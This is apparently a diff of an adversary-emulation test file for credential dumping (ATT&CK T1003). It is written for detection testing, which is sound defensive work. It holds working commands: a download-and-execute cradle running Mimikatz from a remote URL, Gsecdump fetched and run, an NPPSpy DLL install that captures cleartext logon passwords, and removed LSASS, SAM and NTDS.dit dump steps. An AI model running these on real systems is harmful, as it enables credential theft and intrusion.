@@ -1,219 +1,106 @@
----
 attack_technique: T1003
-display_name: Credential Dumping
-
+display_name: OS Credential Dumping
 atomic_tests:
 - name: Powershell Mimikatz
+  auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
   description: |
-    Dumps Credentials via Powershell by invoking a remote mimikatz script
+    Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
+    If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
+    Common failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution. 
+    Or, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     remote_script:
       description: URL to a remote Mimikatz script that dumps credentials
       type: Url
-      default: https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1
+      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
   executor:
-    name: powershell
-    elevation_required: true
     command: |
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
+    name: powershell
+    elevation_required: true
 
 - name: Gsecdump
+  auto_generated_guid: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
   description: |
-    https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
-  supported_platforms:
-    - windows
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      gsecdump -a
+    Dump credentials from memory using Gsecdump.
 
-- name: Windows Credential Editor
-  description: |
-    http://www.ampliasecurity.com/research/windows-credentials-editor/
+    Upon successful execution, you should see domain\username's following by two 32 characters hashes.
+
+    If you see output that says "compat: error: failed to create child process", execution was likely blocked by Anti-Virus. 
+    You will receive only error output if you do not run this test from an elevated context (run as administrator)
+
+    If you see a message saying "The system cannot find the path specified", try using the get-prereq_commands to download and install Gsecdump first.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
-    output_file:
-      description: Path where resulting data should be placed
+    gsecdump_exe:
+      description: Path to the Gsecdump executable
       type: Path
-      default: output.txt
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      wce -o #{output_file}
-
-- name: Registry dump of SAM, creds, and secrets
-  description: |
-    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
-    via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
-  supported_platforms:
-    - windows
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      reg save HKLM\sam sam
-      reg save HKLM\system system
-      reg save HKLM\security security
-    cleanup_command: |
-      rm sam
-      rm system
-      rm security
-
-- name: Dump LSASS.exe Memory using ProcDump
-  description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
-    ProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.
-  supported_platforms:
-    - windows
-  input_arguments:
-    output_file:
-      description: Path where resulting dump should be placed
-      type: Path
-      default: lsass_dump.dmp
-  executor:
-    elevation_required: true
-    name: command_prompt
-    command: |
-      procdump.exe -accepteula -ma lsass.exe #{output_file}
-
-- name: Dump LSASS.exe Memory using Windows Task Manager
-  description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
-    Manager and administrative permissions.
-  supported_platforms:
-    - windows
-  executor:
-    name: manual
-    steps: |
-      1. Open Task Manager:
-        On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
-        on the task bar and selecting "Task Manager".
-
-      2. Select lsass.exe:
-        If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
-        and select it for manipulation.
-
-      3. Dump lsass.exe memory:
-        Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
-
-
-- name: Offline Credential Theft With Mimikatz
-  description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
-    Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz.
-  supported_platforms:
-    - windows
-  input_arguments:
-    input_file:
-      description: Path where resulting dump should be placed
-      type: Path
-      default: lsass_dump.dmp
-  executor:
-    name: manual
-    steps: |
-      1. Open Mimikatz:
-        Execute `mimikatz` at a command prompt.
-
-      2. Select a Memory Dump:
-        Within the Mimikatz interactive shell, execute `sekurlsa::minidump #{input_file}`
-
-      3. Obtain Credentials:
-        Within the Mimikatz interactive shell, execute `sekurlsa::logonpasswords full`
-
-- name: Dump Active Directory Database with NTDSUtil
-  description: |
-    The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
-    uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
-    subsequent domain controllers without the need of network-based replication.
-  supported_platforms:
-    - windows
-  input_arguments:
-    output_folder:
-      description: Path where resulting dump should be placed
-      type: Path
-      default: C:\Atomic_Red_Team
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
-
-- name: Create Volume Shadow Copy with NTDS.dit
-  description: |
-    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
-  supported_platforms:
-    - windows
-  input_arguments:
-    drive_letter:
-      description: Drive letter to source VSC (including colon)
+      default: PathToAtomicsFolder\T1003\bin\gsecdump.exe
+    gsecdump_bin_hash:
+      description: File hash of the Gsecdump binary file
       type: String
-      default: "C:"
+      default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
+    gsecdump_url:
+      description: Path to download Gsecdump binary file
+      type: url
+      default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Gsecdump must exist on disk at specified location (#{gsecdump_exe})
+    prereq_command: |
+      if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
+        Move-Item $binpath "#{gsecdump_exe}"
+      }
   executor:
+    command: |
+      #{gsecdump_exe} -a
     name: command_prompt
     elevation_required: true
-    command: |
-      vssadmin.exe create shadow /for=#{drive_letter}
 
-- name: Copy NTDS.dit from Volume Shadow Copy
-  description: |
-    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
-
-    This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
-    A successful test also requires the export of the SYSTEM Registry hive. 
-    This test must be executed on a Windows Domain Controller.
+- name: Credential Dumping with NPPSpy
+  auto_generated_guid: 9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6
+  description: |-
+    Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.
+    After user's logging in cleartext password is saved in C:\NPPSpy.txt.
+    Clean up deletes the files and reverses Registry changes.
+    NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
   supported_platforms:
-    - windows
-  input_arguments:
-    vsc_name:
-      description: Name of Volume Shadow Copy
-      type: String
-      default: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
-    extract_path:
-      description: Path for extracted NTDS.dit
-      type: Path
-      default: C:\Extract
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: NPPSpy.dll must exist in PathToAtomicsFolder\T1003\bin directory
+    prereq_command: if (Test-Path "PathToAtomicsFolder\T1003\bin\NPPSpy.dll") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      $rv = mkdir PathToAtomicsFolder\T1003\bin
+      Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\T1003\bin\NPPSpy.dll"
   executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
-      copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
-      reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
-
-- name: GPP Passwords (findstr)
-  description: |
-    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
-
-  supported_platforms:
-    - windows
-
-  executor:
-    name: command_prompt
-    elevation_required: false
-    command: |
-      findstr /S cpassword %logonserver%\sysvol\*.xml
-
-- name: GPP Passwords (Get-GPPPassword)
-  description: |
-    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    gpp_script_path:
-      description: Path to the Get-GPPPassword PowerShell Script
-      type: Path
-      default: $PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
-
-  executor:
+    command: |-
+      Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
+      $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
+      $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
+      Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
+      $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
+      $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
+      $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
+      $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
+      $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
+      echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
+    cleanup_command: |-
+      $cleanupPath = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
+      $cleanupUpdatedValue = $cleanupPath.PROVIDERORDER 
+      $cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''
+      Set-ItemProperty -Path $cleanupPath.PSPath -Name "PROVIDERORDER" -Value $cleanupUpdatedValue
+      Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy" -Recurse -ErrorAction Ignore
+      Remove-Item C:\NPPSpy.txt -ErrorAction Ignore
+      Remove-Item C:\Windows\System32\NPPSpy.dll -ErrorAction Ignore
     name: powershell
-    elevation_required: false
-    command: |
-      . #{gpp_script_path}
-      Get-GPPPassword -Verbose
+    elevation_required: true
